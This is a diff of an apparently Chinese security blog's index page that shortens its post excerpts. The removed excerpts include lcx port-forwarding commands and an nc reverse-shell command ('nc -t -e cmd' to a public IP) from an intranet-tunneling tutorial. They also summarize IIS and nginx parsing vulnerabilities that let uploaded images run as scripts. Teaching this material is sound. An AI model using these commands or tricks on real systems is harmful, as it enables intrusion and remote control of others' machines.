@@ -157,17 +157,10 @@
         
         
           
+          
         
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">lcx情景：本地内网主机：A公网主机：B目标内网主机：C
-C可以访问公网，不能被公网访问
-命令：C：lcx.exe -slave 47.101.36.165 7777 127.0.0.1 3389B：lcx.exe -listen 7777 8888
-此时，可以主机A可以通过访问公网IP加端口8888来连接内网主机C的3389
-nc情景：本地内网主机：A公网主机：B目标内网主机：C
-C可以访问公网，不能被公网访问
-命令：B：nc -lvvp 8888C：nc -t -e cmd 47.101.36.165 8888
-此时，公网主机B能收到内网主机C的反弹cmd
-ew情景1：本地内网主机：A公网</div>
+        <div class="index-excerpt" style="max-height: none;">
+          <div class="index-text mb-1">前言在内网渗透的过程中，我们会碰到一些列的复杂网络环境。因此如何穿透内网环境是渗透过程中必须要考虑的事。...</div>
         </div>
       </a>
 
@@ -203,19 +196,10 @@ ew情景1：本地内网主机：A公网</div>
         
         
           
+          
         
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">前言最近受大佬启发，觉得需要往内网方向有所了解。于是开始学习内网渗透。但是苦于没有什么现成的环境，只能够自己手动搭建。
-准备Windows server 2012 1台、Windows 7 2台、vmware
-网络环境windows server 2012（DC）: 域控服务器
-IP：10.16.11.21
-windows 7（DM）: 配备两张网卡，一张通物理机，一张通域内网
-IP：10.16.11.22，192.168.100.196
-windows 7（DM）: 一张网卡，通域内网
-IP：10.16.11.23
-域控架设配置IP与DNS首先要配置静态IP，在网络和共享中心里进行配置
-
-配</div>
+        <div class="index-excerpt" style="max-height: none;">
+          <div class="index-text mb-1">前言最近受大佬启发，觉得需要往内网方向有所了解。于是开始学习内网渗透。但是苦于没有什么现成的环境，只能够自己手动搭建。...</div>
         </div>
       </a>
 
@@ -251,13 +235,10 @@ IP：10.16.11.23
         
         
           
+          
         
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">前言初次了解域渗透，并不是很了解域的概念，并不清楚域的一些功用。因此记录一些前置的知识和自己的理解
-工作组工作组是局域网中的一个概念，由若干同一地点、同一网络的用户组成的小组。
-工作组中的计算机是对等的，即访问每台电脑需要用对应电脑的账户登陆，才能获取资源。
-域域–Domain，windows网络中独立运行的单位，域之间相互访问需要建立信任关系。信任是域与域之间的桥梁。两个域之间建立了信任关系，则可以跨域管理、实现跨域网络资源共享、相互通信与数据传输。
-域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管</div>
+        <div class="index-excerpt" style="max-height: none;">
+          <div class="index-text mb-1">前言初次了解域渗透，并不是很了解域的概念，并不清楚域的一些功用。因此记录一些前置的知识和自己的理解...</div>
         </div>
       </a>
 
@@ -293,19 +274,10 @@ IP：10.16.11.23
         
         
           
+          
         
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">前言因为搞站中碰到了一起解析漏洞的站，所以对此总结一下所有解析漏洞
-IISIIS5.x/6.0目录解析目录名包含.asp .asa .cer这种字样，该文件夹下所有的文件均可以当作asp来解析
-文件解析以为服务器不解析;后的内容，所以/xx.asp;.jpg可以被当作asp来解析
-IIS特殊后缀名
-asa
-cer
-cdx
-
-IIS7.0/IIS7.5默认fast-cgi开启状况下，在一个文件路径后面加上/xx.php会将原来的文件解析为php文件
-如：test.jpg/.php会被当做php来执行
-nginx畸形解析漏洞默认fast-cgi开启状况下，在一个文件路径后面加上/xx.php会将原</div>
+        <div class="index-excerpt" style="max-height: none;">
+          <div class="index-text mb-1">前言因为搞站中碰到了一起解析漏洞的站，所以对此总结一下所有解析漏洞...</div>
         </div>
       </a>
 
@@ -341,10 +313,10 @@ nginx畸形解析漏洞默认fast-cgi开启状况下，在一个文件路径后�
         
         
           
+          
         
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">前言最近做了一个ctf，里面碰到了一道web-crypro的题(你说你考的是crypro关我web什么事)。当时没有做出来，现在复盘。也是因为看了神仙writeup才有这个能力
-ctf这是bsidessf举办的一场ctf，他们的官网如下：https://bsidessf.org/题目的主界面如下：也没有其他功能，尝试登陆，登陆成功：这里无论什么账号密码都可以登陆。登陆后提示现实我们需要设置is_admin的值为1，这里is_admin默认值为0，我们尝试修改，再次登陆发现并没有成功，看来不是该前端能解决的(这都能解决也对不起它的分值)。尝试抓包，发下如下两个可疑包：分析其功能，就是在登陆的时候</div>
+        <div class="index-excerpt" style="max-height: none;">
+          <div class="index-text mb-1">前言最近做了一个ctf，里面碰到了一道web-crypro的题(你说你考的是crypro关我web什么事)。当时没有做出来，现在复盘。也是因为看了神仙writeup才有这个能力...</div>
         </div>
       </a>
 
